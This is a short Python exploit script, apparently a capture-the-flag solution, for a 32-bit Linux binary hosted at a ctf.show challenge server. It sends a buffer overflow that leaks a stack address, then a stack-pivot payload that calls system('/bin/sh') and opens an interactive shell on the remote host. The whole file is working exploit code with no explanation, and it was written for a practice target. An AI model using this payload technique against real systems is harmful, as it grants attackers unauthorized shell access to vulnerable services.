from kk import *
context(arch='i386', os='linux')
p = remote('pwn.challenge.ctf.show', 28210)
#p = process('./pwn')
elf = ELF('./pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#GDB(p)
p.recvuntil(b"your codename:")
p.send(b'a'*0x24 + b'b'*4)

p.recvuntil(b"bbbb")
m = u32(p.recv(4))
print(hex(m))

ebp = m - 0x38
print(hex(ebp))

p.recvuntil(b"What do you want to do?")
payload = (p32(elf.sym['system']) + b'a'*4  + p32(ebp+12) + b'/bin/sh\x00').ljust(0x28, b'a') + p32(ebp-4) + p32(0x080486D7)

p.send(payload)

p.interactive()